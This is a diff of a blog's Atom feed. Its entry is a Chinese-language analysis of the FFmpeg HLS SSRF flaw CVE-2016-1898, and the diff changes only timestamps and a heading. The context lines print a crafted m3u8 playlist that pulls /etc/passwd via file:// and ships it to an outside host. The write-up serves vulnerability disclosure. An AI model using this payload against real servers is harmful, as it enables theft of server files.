@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-01-19T08:31:25.000Z</updated>
+  <updated>2016-01-19T08:35:57.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
     <published>2016-01-18T10:41:41.000Z</published>
-    <updated>2016-01-19T08:31:25.000Z</updated>
+    <updated>2016-01-19T08:35:57.000Z</updated>
     <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
 <p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
 <p><img src="/images/ffmpegssrf2.png" alt=""></p>
@@ -31,8 +31,7 @@
 <span class="preprocessor">#EXTINF:10.0,</span>
 concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
 <span class="preprocessor">#EXT-X-ENDLIST</span>
-</code></pre><p>CVE-2016-1898</p>
-<p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
+</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
 <pre><code><span class="comment">#EXTM3U</span>
 <span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
 <span class="comment">#EXTINF:10.0,</span>
